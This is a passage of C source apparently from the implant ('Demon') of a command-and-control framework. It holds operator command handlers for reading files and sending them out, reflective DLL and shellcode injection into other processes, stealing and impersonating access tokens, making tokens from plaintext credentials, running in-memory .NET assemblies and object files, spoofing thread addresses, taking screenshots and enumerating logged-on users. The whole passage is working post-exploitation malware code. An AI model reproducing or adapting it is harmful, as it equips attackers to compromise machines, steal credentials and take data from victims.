            hFile = Instance.Win32.CreateFileW( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
            if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
            {
                PUTS( "CreateFileW: Failed" )
                CALLBACK_GETLASTERROR
                goto CleanupCat;
            }

            FileSize = Instance.Win32.GetFileSize( hFile, 0 );
            Content  = Instance.Win32.LocalAlloc( LPTR, FileSize );

            if ( ! Instance.Win32.ReadFile( hFile, Content, FileSize, &Read, NULL ) )
            {
                PUTS( "ReadFile: Failed" )
                CALLBACK_GETLASTERROR
                goto CleanupDownload;
            }

            PackageAddBytes( Package, FileName, NameSize );
            PackageAddBytes( Package, Content,  FileSize );

        CleanupCat:
            if ( hFile )
            {
                Instance.Win32.NtClose( hFile );
                hFile = NULL;
            }

            if ( Content )
            {
                MemSet( Content, 0, FileSize );
                Instance.Win32.LocalFree( Content );
                Content = NULL;
            }
            break;
        }

        default:
        {
            PRINTF( "FS SubCommand not found: %d : %x\n", Command, Command );
            break;
        }
    }

    PUTS( "Transmit package" )
    PackageTransmit( Package, NULL, NULL );

LEAVE:
    PUTS( "PackageDestroy" )
    PackageDestroy( Package );
}

VOID CommandInlineExecute( PPARSER Parser )
{
    DWORD FunctionNameSize = 0;
    DWORD ObjectDataSize   = 0;
    DWORD ArgSize          = 0;
    DWORD Status           = 0;
    PCHAR FunctionName     = ParserGetBytes( Parser, &FunctionNameSize );
    PCHAR ObjectData       = ParserGetBytes( Parser, &ObjectDataSize );
    PCHAR ArgBuffer        = ParserGetBytes( Parser, &ArgSize );
    INT32 Flags            = ParserGetInt32( Parser );

    // why? don't know anymore but I don't wanna touch it for now
    StringCopyA( FunctionName, FunctionName );

    FunctionName[ FunctionNameSize ] = 0;

    switch ( Flags )
    {
        case 0:
        {
            PUTS( "Use Non-Threaded CoffeeLdr" )
            Status = CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
            if ( Status )
            {
                PackageTransmitError( CALLBACK_ERROR_COFFEXEC, Status );
            }
            break;
        }

        case 1:
        {
            PUTS( "Use Threaded CoffeeRunner" )
            CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize );
            break;
        }

        default:
        {
            PUTS( "Use default (from config) CoffeeLdr" )

            if ( Instance.Config.Implant.CoffeeThreaded )
            {
                PUTS( "Config is set to threaded" )
                CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize );
            }
            else
            {
                PUTS( "Config is set to non-threaded" )
                Status = CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
                if ( Status )
                {
                    PackageTransmitError( CALLBACK_ERROR_COFFEXEC, Status );
                }
            }

            break;
        }
    }

    MemSet( ObjectData, 0, ObjectDataSize );
}

VOID CommandInjectDLL( PPARSER Parser )
{
    PPACKAGE          Package   = PackageCreate( DEMON_COMMAND_INJECT_DLL );

    DWORD             DllSize   = 0;
    DWORD             Result    = 1;
    NTSTATUS          NtStatus  = STATUS_SUCCESS;
    PCHAR             DllBytes  = NULL;
    HANDLE            hProcess  = NULL;
    CLIENT_ID         ProcID    = { 0 };
    OBJECT_ATTRIBUTES ObjAttr   = { sizeof( ObjAttr ) };
    INJECTION_CTX     InjCtx    = { 0 };

    InjCtx.Technique = ParserGetInt32( Parser );
    InjCtx.ProcessID = ParserGetInt32( Parser );
    DllBytes         = ParserGetBytes( Parser, &DllSize );
    InjCtx.Parameter = ParserGetBytes( Parser, &InjCtx.ParameterSize );

    PRINTF( "Technique: %d\n", InjCtx.Technique )
    PRINTF( "ProcessID: %d\n", InjCtx.ProcessID )
    PRINTF( "DllBytes : %x [%d]\n", DllBytes, DllSize );
    PRINTF( "Parameter: %x [%d]\n", InjCtx.Parameter, InjCtx.ParameterSize );

    ProcID.UniqueProcess = InjCtx.ProcessID;

    if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcess( &hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, &ObjAttr, &ProcID ) ) )
    {
        Result = DllInjectReflective( hProcess, DllBytes, DllSize, InjCtx.Parameter, InjCtx.ParameterSize, &InjCtx );
    }
    else
    {
        PUTS( "[-] NtOpenProcess: Failed to open process" )
        PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
    }

    PRINTF( "Injected Result: %d\n", Result )

    PackageAddInt32( Package, Result );
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandSpawnDLL( PPARSER Parser )
{
    PPACKAGE      Package   = NULL;
    INJECTION_CTX InjCtx    = { 0 };
    DWORD         DllSize   = 0;
    DWORD         ArgSize   = 0;
    PCHAR         DllBytes  = ParserGetBytes( Parser, &DllSize );
    PCHAR         Arguments = ParserGetBytes( Parser, &ArgSize );
    DWORD         Result    = 0;

    Package = PackageCreate( DEMON_COMMAND_SPAWN_DLL );
    Result  = DllSpawnReflective( DllBytes, DllSize, Arguments, ArgSize, &InjCtx );

    PackageAddInt32( Package, Result );
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandInjectShellcode( PPARSER Parser )
{
    PPACKAGE      Package        = PackageCreate( DEMON_COMMAND_INJECT_SHELLCODE );
    UINT32        ShellcodeSize  = 0;
    UINT32        ArgumentSize   = 0;

    BOOL          Inject         = ( BOOL )  ParserGetInt32( Parser );
    SHORT         Technique      = ( SHORT ) ParserGetInt32( Parser );
    SHORT         TargetArch     = ( SHORT ) ParserGetInt32( Parser );
    PVOID         ShellcodeBytes = ParserGetBytes( Parser, &ShellcodeSize );
    PVOID         ShellcodeArgs  = ParserGetBytes( Parser, &ArgumentSize );
    DWORD         TargetPID      = ParserGetInt32( Parser );

    DWORD         Result         = ERROR_SUCCESS;
    INJECTION_CTX InjectionCtx   = {
            .ProcessID      = TargetPID,
            .hThread        = NULL,
            .Arch           = TargetArch,
            .Parameter      = ShellcodeArgs,
            .ParameterSize  = ArgumentSize,
    };

    PRINTF( "Inject[%s] Technique[%d] TargetPID:[%d] TargetProcessArch:[%d] ShellcodeSize:[%d]\n", Inject ? "TRUE" : "FALSE", Technique, TargetPID, TargetArch, ShellcodeSize );

    if ( Inject == 1 )
    {
        // Inject into running process
        CLIENT_ID         ClientID = { TargetPID, 0 };
        NTSTATUS          NtStatus = 0;
        OBJECT_ATTRIBUTES ObjAttr  = { sizeof( ObjAttr ) };

        NtStatus = Instance.Syscall.NtOpenProcess( &InjectionCtx.hProcess, PROCESS_ALL_ACCESS, &ObjAttr, &ClientID );

        if ( ! NT_SUCCESS( NtStatus ) )
        {
            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            return;
        }
    }
    else if ( Inject == 2 )
    {
        // Execute
        InjectionCtx.hProcess = NtCurrentProcess();
    }

    Technique = Technique == 0 ? Instance.Config.Inject.Technique : Technique; // if the teamserver specified 0 ==> means that it should use the technique from the config

    PRINTF( "Technique going to be used => %d\n", Technique )

    Result = ShellcodeInjectDispatch(
        Inject,
        Technique,
        ShellcodeBytes,
        ShellcodeSize,
        &InjectionCtx
    );

    PRINTF( "Injection Result => %d", Result )

    PackageAddInt32( Package, Result );
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandToken( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_TOKEN );
    DWORD    Command = ParserGetInt32( Parser );

    PRINTF( "Command => %d\n", Command )

    PackageAddInt32( Package, Command );
    switch ( Command )
    {
        case 0x1: PUTS( "Token::Impersonate" )
        {
            DWORD            dwTokenID = ParserGetInt32( Parser );
            PTOKEN_LIST_DATA TokenData = NULL;

            TokenData = TokenGet( dwTokenID );

            if ( ! TokenData )
            {
                PUTS( "Token not found in vault." )
                PackageTransmitError( CALLBACK_ERROR_TOKEN, 0x1 );
                return;
            }

            TokenSetPrivilege( SE_DEBUG_NAME, TRUE );

            if ( ! Instance.Win32.RevertToSelf() )
                CALLBACK_GETLASTERROR

            if ( Instance.Win32.ImpersonateLoggedOnUser( TokenData->Handle ) )
            {
                Instance.Tokens.Impersonate = TRUE;
                Instance.Tokens.Token       = TokenData;

                PRINTF( "[+] Successful impersonated: %s\n", TokenData->DomainUser );

                PackageAddInt32( Package, TRUE );
            }
            else
            {
                Instance.Tokens.Impersonate = FALSE;
                Instance.Tokens.Token       = NULL;

                PRINTF( "[!] Failed to impersonate token user: %s\n", TokenData->DomainUser );

                CALLBACK_GETLASTERROR

                PackageAddInt32( Package, FALSE );

                if ( ! Instance.Win32.RevertToSelf() )
                    CALLBACK_GETLASTERROR
            }

            PackageAddBytes( Package, TokenData->DomainUser, StringLengthA( TokenData->DomainUser ) );
            break;
        }

        case 0x2: PUTS( "Token::Steal" )
        {
            DWORD  TargetPid   = ParserGetInt32( Parser );
            HANDLE StolenToken = TokenSteal( TargetPid );
            DWORD  UserSize    = 0;
            PUCHAR User        = NULL;
            DWORD  NewTokenID  = 0;

            if ( ! StolenToken )
            {
                PUTS( "[!] Couldn't get remote process token" )
                return;
            }

            User       = TokenGetUserDomain( StolenToken, &UserSize );
            NewTokenID = TokenAdd( StolenToken, User, TOKEN_TYPE_STOLEN, TargetPid, NULL, NULL, NULL );

            PRINTF( "[^] New Token added to the Vault: %d User:[%s]\n", NewTokenID, User );

            PackageAddBytes( Package, User, UserSize );
            PackageAddInt32( Package, NewTokenID );
            PackageAddInt32( Package, TargetPid );

            if ( User )
            {
                DATA_FREE( User, UserSize );
            }

            break;
        }

        case 0x3: PUTS( "Token::List" )
        {
            PTOKEN_LIST_DATA TokenList  = Instance.Tokens.Vault;
            DWORD            TokenIndex = 0;

            do {
                if ( TokenList != NULL )
                {
                    PRINTF( "[TOKEN_LIST] Index:[%d] Handle:[0x%x] User:[%s] Pid:[%d]\n", TokenIndex, TokenList->Handle, TokenList->DomainUser, TokenList->dwProcessID );

                    PackageAddInt32( Package, TokenIndex );
                    PackageAddInt32( Package, TokenList->Handle );
                    PackageAddBytes( Package, TokenList->DomainUser, StringLengthA( TokenList->DomainUser ) );
                    PackageAddInt32( Package, TokenList->dwProcessID );
                    PackageAddInt32( Package, TokenList->Type );

                    TokenList = TokenList->NextToken;
                }
                else
                    break;

                TokenIndex++;
            } while ( TRUE );
            break;
        }

        case 0x4: PUTS( "Token::PrivsGetOrList" )
        {
            PTOKEN_PRIVILEGES TokenPrivs = NULL;
            DWORD             TPSize      = 0;
            DWORD             Length      = 0;
            HANDLE            TokenHandle = NULL;
            BOOL              ListPrivs   = ParserGetInt32( Parser );

            PackageAddInt32( Package, ListPrivs );

            if ( ListPrivs )
            {
                PUTS( "Privs::List" )
                TokenHandle = TokenCurrentHandle();

                Instance.Win32.GetTokenInformation( TokenHandle, TokenPrivileges, TokenPrivs, 0, &TPSize );
                TokenPrivs = Instance.Win32.LocalAlloc( LPTR, ( TPSize + 1 ) * sizeof( TOKEN_PRIVILEGES ) );

                CHAR Name[ MAX_PATH ] = { 0 };

                if ( TokenPrivs )
                {
                    if ( Instance.Win32.GetTokenInformation( TokenHandle, TokenPrivileges, TokenPrivs, TPSize, &TPSize ) )
                    {
                        for ( INT i = 0; i < TokenPrivs->PrivilegeCount; i++ )
                        {
                            Length = MAX_PATH;
                            Instance.Win32.LookupPrivilegeNameA( NULL, &TokenPrivs->Privileges[ i ].Luid, Name, &Length );
                            PackageAddBytes( Package, Name, Length );
                            PackageAddInt32( Package, TokenPrivs->Privileges[ i ].Attributes );
                        }
                    }
                }
            }
            else
            {
                PUTS( "Privs::Get" )
                /* TODO: implement */
            }

            if ( TokenPrivs )
            {
                MemSet( TokenPrivs, 0, sizeof( TOKEN_PRIVILEGES ) );
                Instance.Win32.LocalFree( TokenPrivs );
                TokenPrivs = NULL;
            }

            break;
        }

        case 0x5: PUTS( "Token::Make" )
        {
            DWORD  dwUserSize     = 0;
            DWORD  dwPasswordSize = 0;
            DWORD  dwDomainSize   = 0;
            PCHAR  lpDomain       = ParserGetBytes( Parser, &dwDomainSize );
            PCHAR  lpUser         = ParserGetBytes( Parser, &dwUserSize );
            PCHAR  lpPassword     = ParserGetBytes( Parser, &dwPasswordSize );
            UCHAR  Deli[ 2 ]      = { '\\', 0 };
            HANDLE hToken         = NULL;
            PCHAR  UserDomain     = NULL;
            LPSTR  BufferUser     = NULL;
            LPSTR  BufferPassword = NULL;
            LPSTR  BufferDomain   = NULL;
            DWORD  UserDomainSize = dwUserSize + dwDomainSize + 1;

            if ( dwUserSize > 0 && dwPasswordSize > 0 && dwDomainSize > 0 )
            {
                PRINTF( "Create new token: Domain:[%s] User:[%s] Password:[%s]", lpDomain, lpUser, lpPassword )

                lpUser[ dwUserSize ]         = 0;
                lpPassword[ dwPasswordSize ] = 0;
                lpDomain[ dwDomainSize ]     = 0;

                hToken = TokenMake( lpUser, lpPassword, lpDomain );
                if ( hToken != NULL )
                {
                    UserDomain = Instance.Win32.LocalAlloc( LPTR, UserDomainSize );

                    MemSet( UserDomain, 0, UserDomainSize );

                    StringConcatA( UserDomain, lpDomain );
                    StringConcatA( UserDomain, Deli );
                    StringConcatA( UserDomain, lpUser );

                    BufferUser     = Instance.Win32.LocalAlloc( LPTR, dwUserSize );
                    BufferPassword = Instance.Win32.LocalAlloc( LPTR, dwPasswordSize );
                    BufferDomain   = Instance.Win32.LocalAlloc( LPTR, dwDomainSize );

                    MemCopy( BufferUser, lpUser, dwUserSize );
                    MemCopy( BufferPassword, lpPassword, dwPasswordSize );
                    MemCopy( BufferDomain, lpDomain, dwDomainSize );

                    TokenAdd(
                        hToken,
                        UserDomain,
                        TOKEN_TYPE_MAKE_NETWORK,
                        NtCurrentTeb()->ClientId.UniqueProcess,
                        BufferUser,
                        BufferDomain,
                        BufferPassword
                    );

                    PRINTF( "UserDomain => %s\n", UserDomain )

                    PackageAddBytes( Package, UserDomain, UserDomainSize );
                }
            }

            break;
        }

        case 0x6: PUTS( "Token::GetUID" )
            {
            DWORD           cbSize     = sizeof( TOKEN_ELEVATION );
            TOKEN_ELEVATION Elevation  = { 0 };
            HANDLE          hToken     = TokenCurrentHandle( );
            NTSTATUS        NtStatus   = STATUS_SUCCESS;
            DWORD           dwUserSize = 0;
            PCHAR           User       = NULL;

            PRINTF( "[x] hToken: 0x%x\n", hToken );

            if ( ! hToken )
                return;

            if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtQueryInformationToken( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) ) )
            {
                PUTS( "NtQueryInformationToken: Failed" )
                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                return;
            }
            PUTS( "NtQueryInformationToken: Success" )

            User = TokenGetUserDomain( hToken, &dwUserSize );

            PackageAddInt32( Package, Elevation.TokenIsElevated );
            PackageAddBytes( Package, User, dwUserSize );

            Instance.Win32.NtClose( hToken );

            if ( User )
            {
                DATA_FREE( User, dwUserSize )
            }

            break;
        }

        case 0x7: PUTS( "Token::Revert" )
        {
            BOOL Success = Instance.Win32.RevertToSelf();

            PackageAddInt32( Package, Success );

            if ( ! Success )
                CALLBACK_GETLASTERROR;

            Instance.Tokens.Token       = NULL;
            Instance.Tokens.Impersonate = FALSE;

            break;
        }

        case 0x8: PUTS( "Token::Remove" )
        {
            DWORD TokenID = ParserGetInt32( Parser );

            PackageAddInt32( Package, TokenRemove( TokenID ) );
            PackageAddInt32( Package, TokenID );

            break;
        }

        case 0x9: PUTS( "Token::Clear" )
        {

            TokenClear();

            break;
        }
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandAssemblyInlineExecute( PPARSER Parser )
{
    if ( ! Instance.Dotnet )
    {
        BUFFER Buffer       = { 0 };
        BUFFER AssemblyData = { 0 };
        BUFFER AssemblyArgs = { 0 };

        Instance.Dotnet          = NtHeapAlloc( sizeof( DOTNET_ARGS ) );
        Instance.Dotnet->Invoked = FALSE;

        /* Parse Pipe Name */
        Buffer.Buffer = ParserGetBytes( Parser, &Buffer.Length );
        Instance.Dotnet->PipeName.Buffer = NtHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
        Instance.Dotnet->PipeName.Length = Buffer.Length;
        MemCopy( Instance.Dotnet->PipeName.Buffer, Buffer.Buffer, Instance.Dotnet->PipeName.Length );

        /* Parse AppDomain Name */
        Buffer.Buffer = ParserGetBytes( Parser, &Buffer.Length );
        Instance.Dotnet->AppDomainName.Buffer = NtHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
        Instance.Dotnet->AppDomainName.Length = Buffer.Length;
        MemCopy( Instance.Dotnet->AppDomainName.Buffer, Buffer.Buffer, Instance.Dotnet->AppDomainName.Length );

        /* Parse Net Version */
        Buffer.Buffer = ParserGetBytes( Parser, &Buffer.Length );
        Instance.Dotnet->NetVersion.Buffer = NtHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
        Instance.Dotnet->NetVersion.Length = Buffer.Length;
        MemCopy( Instance.Dotnet->NetVersion.Buffer, Buffer.Buffer, Instance.Dotnet->NetVersion.Length );

        /* Parse Assembly */
        AssemblyData.Buffer = ParserGetBytes( Parser, &AssemblyData.Length );

        /* Parse Argument */
        AssemblyArgs.Buffer = ParserGetBytes( Parser, &Buffer.Length );

        PRINTF(
            "Parsed Arguments:         \n"
            " - PipeName     [%d]: %ls \n"
            " - AppDomain    [%d]: %ls \n"
            " - NetString    [%d]: %ls \n"
            " - AssemblyArgs [%d]: %ls \n"
            " - AssemblyData [%d]: %p  \n",
            Instance.Dotnet->PipeName.Length,      Instance.Dotnet->PipeName.Buffer,
            Instance.Dotnet->AppDomainName.Length, Instance.Dotnet->AppDomainName.Buffer,
            Instance.Dotnet->NetVersion.Length,    Instance.Dotnet->NetVersion.Buffer,
            AssemblyArgs.Length,                   AssemblyArgs.Buffer,
            AssemblyData.Length,                   AssemblyData.Buffer
        )

        if ( ! DotnetExecute( AssemblyData, AssemblyArgs ) )
        {
            PPACKAGE Package = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
            PackageAddInt32( Package, DOTNET_INFO_FAILED );
            PackageTransmit( Package, NULL, NULL );

            DotnetClose();
        }

        PUTS( "Finished with Assembly inline execute" )
    }
    else
    {
        PUTS( "Dotnet instance already running." )
    }
}

VOID CommandAssemblyListVersion( VOID )
{
    PPACKAGE         Package      = PackageCreate( DEMON_COMMAND_ASSEMBLY_VERSIONS );
    PICLRMetaHost    pClrMetaHost = { NULL };
    PIEnumUnknown    pEnumClr     = { NULL };
    PICLRRuntimeInfo pRunTimeInfo = { NULL };

    if ( Instance.Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, &pClrMetaHost ) == S_OK )
    {
        if ( ( pClrMetaHost )->lpVtbl->EnumerateInstalledRuntimes( pClrMetaHost, &pEnumClr ) == S_OK )
        {
            DWORD dwStringSize = 0;
            while ( TRUE )
            {
                IUnknown *UPTR      = { 0 };
                ULONG    fetched    = 0;

                if ( pEnumClr->lpVtbl->Next( pEnumClr, 1, &UPTR, &fetched ) == S_OK )
                {
                    pRunTimeInfo = ( ICLRRuntimeInfo* ) { UPTR };
                    if ( pRunTimeInfo->lpVtbl->GetVersionString( pRunTimeInfo, NULL, &dwStringSize ) == HRESULT_FROM_WIN32( ERROR_INSUFFICIENT_BUFFER ) && dwStringSize > 0 )
                    {
                        LPVOID Version = Instance.Win32.LocalAlloc( LPTR, dwStringSize );

                        if ( pRunTimeInfo->lpVtbl->GetVersionString( pRunTimeInfo, Version, &dwStringSize ) == S_OK )
                        {
                            dwStringSize = WCharStringToCharString( ( PCHAR ) Version, Version, dwStringSize * 2 );
                            PRINTF( "Version[ %d ]: %s\n", dwStringSize, Version );
                            PackageAddBytes( Package, Version, dwStringSize );
                        }

                        Instance.Win32.LocalFree( Version );
                        Version = NULL;
                    }
                    else
                        PUTS("Failed Got Version String")
                }
                else break;
            }
        }
        else
            PUTS("Failed to enumerate")
    }
    else
        PUTS("Failed to CLRCreateInstance");

    if ( pClrMetaHost )
    {
        pClrMetaHost->lpVtbl->Release( pClrMetaHost );
        pClrMetaHost = NULL;
    }

    if ( pEnumClr )
    {
        pEnumClr->lpVtbl->Release( pEnumClr );
        pEnumClr = NULL;
    }

    if ( pRunTimeInfo )
    {
        pRunTimeInfo->lpVtbl->Release( pRunTimeInfo );
        pRunTimeInfo = NULL;
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandConfig( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_CONFIG );
    UINT32   Config  = ParserGetInt32( Parser );

    PackageAddInt32( Package, Config );

    switch ( Config )
    {
        case DEMON_CONFIG_SHOW_ALL:
        {
            break;
        }

        case DEMON_CONFIG_IMPLANT_SPFTHREADADDR:
        {
            DWORD   LibSize    = 0;
            DWORD   FuncSize   = 0;
            PCHAR   Library    = ParserGetBytes( Parser, &LibSize );
            PCHAR   Function   = ParserGetBytes( Parser, &FuncSize );
            UINT32  Offset     = ParserGetInt32( Parser );
            PVOID   ThreadAddr = NULL;

            Library[ LibSize ] = 0;
            Function[ FuncSize ] = 0;

            PRINTF( "Library  => %s\n", Library );
            PRINTF( "Function => %s\n", Function );
            PRINTF( "Offset => %x\n", Offset );

            if ( Library )
            {
                PVOID hLib = NULL;

                // TODO: check in the current PEB too
                hLib = LdrModuleLoad( Library );
                PRINTF( "hLib => %x\n", hLib );

                if ( hLib )
                {
                    ThreadAddr = LdrFunctionAddr( hLib, HashStringA( Function ) );
                    if ( ThreadAddr )
                        Instance.Config.Implant.ThreadStartAddr = ThreadAddr + Offset;
                    else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );

                    PRINTF( "ThreadAddr => %x\n", ThreadAddr );
                }
                else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
            }

            PackageAddBytes( Package, Library, LibSize );
            PackageAddBytes( Package, Function, FuncSize );

            break;
        }

        case DEMON_CONFIG_IMPLANT_SLEEP_TECHNIQUE:
        {
            Instance.Config.Implant.SleepMaskTechnique = ParserGetInt32( Parser );
            PRINTF( "Set sleep obfuscation technique to %d\n", Instance.Config.Implant.SleepMaskTechnique )
            PackageAddInt32( Package, Instance.Config.Implant.SleepMaskTechnique );
            break;
        }

        case DEMON_CONFIG_IMPLANT_VERBOSE:
        {
            Instance.Config.Implant.Verbose = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance.Config.Implant.Verbose );
            break;
        }

        case DEMON_CONFIG_IMPLANT_COFFEE_VEH:
        {
            Instance.Config.Implant.CoffeeVeh = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance.Config.Implant.CoffeeVeh );
            break;
        }

        case DEMON_CONFIG_IMPLANT_COFFEE_THREADED:
        {
            Instance.Config.Implant.CoffeeThreaded = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance.Config.Implant.CoffeeThreaded );
            break;
        }

        case DEMON_CONFIG_MEMORY_ALLOC:
        {
            Instance.Config.Memory.Alloc = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance.Config.Memory.Alloc );
            break;
        }

        case DEMON_CONFIG_MEMORY_EXECUTE:
        {
            Instance.Config.Memory.Execute = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance.Config.Memory.Execute );
            break;
        }

        case DEMON_CONFIG_INJECTION_TECHNIQUE:
        {
            Instance.Config.Inject.Technique = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance.Config.Inject.Technique );
            break;
        }

        case DEMON_CONFIG_INJECTION_SPOOFADDR:
        {
            DWORD   LibSize    = 0;
            DWORD   FuncSize   = 0;
            PCHAR   Library    = ParserGetBytes( Parser, &LibSize );
            PCHAR   Function   = ParserGetBytes( Parser, &FuncSize );
            UINT32  Offset     = ParserGetInt32( Parser );
            PVOID   ThreadAddr = NULL;

            Library[ LibSize ] = 0;
            Function[ FuncSize ] = 0;

            PRINTF( "Library  => %s\n", Library );
            PRINTF( "Function => %s\n", Function );
            PRINTF( "Offset => %x\n", Offset );

            if ( Library )
            {
                PVOID hLib = NULL;

                // TODO: check in the current PEB too
                hLib = LdrModuleLoad( Library );
                PRINTF( "hLib => %x\n", hLib );

                if ( hLib )
                {
                    ThreadAddr = LdrFunctionAddr( hLib, HashStringA( Function ) );

                    if ( ThreadAddr )
                        Instance.Config.Inject.SpoofAddr = ThreadAddr + Offset;

                    else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );

                    PRINTF( "ThreadAddr => %x\n", ThreadAddr );
                }
                else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
            }

            PackageAddBytes( Package, Library, LibSize );
            PackageAddBytes( Package, Function, FuncSize );

            break;
        }

        case DEMON_CONFIG_INJECTION_SPAWN64:
        {
            DWORD Size   = 0;
            PVOID Buffer = NULL;

            if ( Instance.Config.Process.Spawn64 )
            {
                MemSet( Instance.Config.Process.Spawn64, 0, StringLengthA( Instance.Config.Process.Spawn64 ) );
                Instance.Win32.LocalFree( Instance.Config.Process.Spawn64 );
                Instance.Config.Process.Spawn64 = NULL;
            }

            Buffer = ParserGetBytes( Parser, &Size );
            Instance.Config.Process.Spawn64 = Instance.Win32.LocalAlloc( LPTR, Size );
            MemCopy( Instance.Config.Process.Spawn64, Buffer, Size );
            Instance.Config.Process.Spawn64[ Size ] = 0;

            PRINTF( "Instance.Config.Process.Spawn64 => %s\n", Instance.Config.Process.Spawn64 );
            PackageAddBytes( Package, Instance.Config.Process.Spawn64, Size );

            break;
        }

        case DEMON_CONFIG_INJECTION_SPAWN32:
        {
            DWORD Size   = 0;
            PVOID Buffer = NULL;

            if ( Instance.Config.Process.Spawn86 )
            {
                MemSet( Instance.Config.Process.Spawn86, 0, StringLengthA( Instance.Config.Process.Spawn86 ) );
                Instance.Win32.LocalFree( Instance.Config.Process.Spawn86 );
                Instance.Config.Process.Spawn86 = NULL;
            }

            Buffer = ParserGetBytes( Parser, &Size );
            Instance.Config.Process.Spawn86 = Instance.Win32.LocalAlloc( LPTR, Size );
            MemCopy( Instance.Config.Process.Spawn86, Buffer, Size );
            Instance.Config.Process.Spawn86[ Size ] = 0;

            PRINTF( "Instance.Config.Process.Spawn86 => %s\n", Instance.Config.Process.Spawn86 );
            PackageAddBytes( Package, Instance.Config.Process.Spawn86, Size );

            break;
        }

        default:
            PackageAddInt32( Package, 0 );
            break;
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandScreenshot( PPARSER Parser )
{
    PUTS( "Screenshot" )
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_SCREENSHOT );
    PVOID    Image   = NULL;
    SIZE_T   Size    = NULL;

    if ( WinScreenshot( &Image, &Size ) )
    {
        PUTS( "Successful took screenshot" )
        PackageAddInt32( Package, TRUE );
        PackageAddBytes( Package, Image, Size );
    }
    else
    {
        PUTS( "Failed to take screenshot" )
        PackageAddInt32( Package, FALSE );
    }

    PackageTransmit( Package, NULL, 0 );
}

// TODO: The Net module is unstable so fix those issues to work on normal workstation and domain server
VOID CommandNet( PPARSER Parser )
{
    PUTS( "NET COMMAND" )
    PPACKAGE Package    = PackageCreate( DEMON_COMMAND_NET );
    UINT32   NetCommand = ParserGetInt32( Parser );

    PackageAddInt32( Package, NetCommand );

    switch ( NetCommand )
    {
        case DEMON_NET_COMMAND_DOMAIN:
        {
            PUTS( "DEMON_NET_COMMAND_DOMAIN" )

            LPSTR Domain = NULL;
            DWORD Length = 0;

            if ( ! Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &Length ) )
            {
                if ( ( Domain = Instance.Win32.LocalAlloc( LPTR, Length ) ) )
                {
                    if ( ! Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, Domain, &Length ) )
                    {
                        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                        PackageDestroy( Package );
                    }
                }
            }

            PackageAddBytes( Package, Domain, Length );

            if ( Domain )
            {
                MemSet( Domain, 0, Length );
                Instance.Win32.LocalFree( Domain );
            }

            break;
        }

        case DEMON_NET_COMMAND_LOGONS:
        {
            PUTS( "DEMON_NET_COMMAND_LOGONS" )

            LPWKSTA_USER_INFO_0 UserInfo        = NULL;
            DWORD               dwLevel         = 0;
            DWORD               dwEntriesRead   = 0;
            DWORD               dwTotalEntries  = 0;
            DWORD               dwResumeHandle  = 0;
            DWORD               NetStatus       = NULL;
            CHAR                UserName[ 260 ] = { 0 };
            DWORD               UserNameSize    = 0;
            LPWSTR              ServerName      = NULL;

            ServerName = ParserGetBytes( Parser, &UserNameSize );

            PackageAddBytes( Package, ServerName, UserNameSize );

            UserNameSize = 0;
            do
            {
                NetStatus = Instance.Win32.NetWkstaUserEnum( ServerName, dwLevel, &UserInfo, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle );
                if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
                {
                    for ( INT i = 0; ( i < dwEntriesRead ); i++ )
                    {
                        if ( UserInfo == NULL )
                            break;

                        UserNameSize = StringLengthW( UserInfo[i].wkui0_username );

                        MemSet( UserName, 0, 260 );
                        UserNameSize = WCharStringToCharString( UserName, UserInfo[i].wkui0_username, UserNameSize );

                        PackageAddBytes( Package, UserName, UserNameSize );
                    }
                }
                else
                {
                    NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NetStatus ) );

                    PRINTF( "NetWkstaUserEnum: Failed [%d]\n", NtGetLastError() );
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto CLEANUP;
                }

                if ( UserInfo )
                {
